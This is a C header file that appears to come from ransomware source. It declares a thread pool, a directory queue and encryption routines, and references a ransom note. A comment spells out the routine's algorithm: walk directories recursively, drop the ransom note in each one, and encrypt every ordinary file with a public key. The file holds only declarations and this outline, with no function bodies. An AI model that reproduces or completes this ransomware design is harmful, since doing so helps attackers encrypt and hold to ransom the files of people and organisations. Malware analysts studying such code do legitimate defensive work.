#pragma once

#ifndef __Threading_h__
#define __Threading_h__
#include "Crypto.h"
extern LPCSTR ransomNoteContent;

struct LL_NODE {
	LPSTR dirName;
	struct LL_NODE* nextNode;
};


typedef struct {
	HANDLE* threadArray;
	int threadCount;
	CRITICAL_SECTION threadCriticalSection;
	LL_NODE* head;
	LL_NODE* tail;
} THREAD_STRUCT;

extern THREAD_STRUCT threadStruct;
void threadEncrypt(THREAD_STRUCT* pThreadStruct);
int initThreadStruct();
void launchThreadEncrypt();
void cleanUpThread();



void freeNode(LL_NODE* node);
LL_NODE* popNode(THREAD_STRUCT* pThreadStruct);
int addNode(THREAD_STRUCT* pThreadStruct, LPSTR name);
LL_NODE* newNode();



// takes in HCRYPTKEY, HCRYPTPROV, directory_to_encrypt
// 1. FindFirstFileW in the directory
// 1,5. If can't find first file, exit
// 2. If the file is a directory, check name -> add directory name back to thread struct. Enter and exit critical section
// 2,5. Make sure to drop the ransom note in the directory.
// 3. If file is a normal file, encrypt -> loop back
// 4. while ( FindNextFileW(file_search_handle, &lpFindFileData, v56) );
// 5. FindClose
int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR directoryName, THREAD_STRUCT* pThreadStruct);
#endif
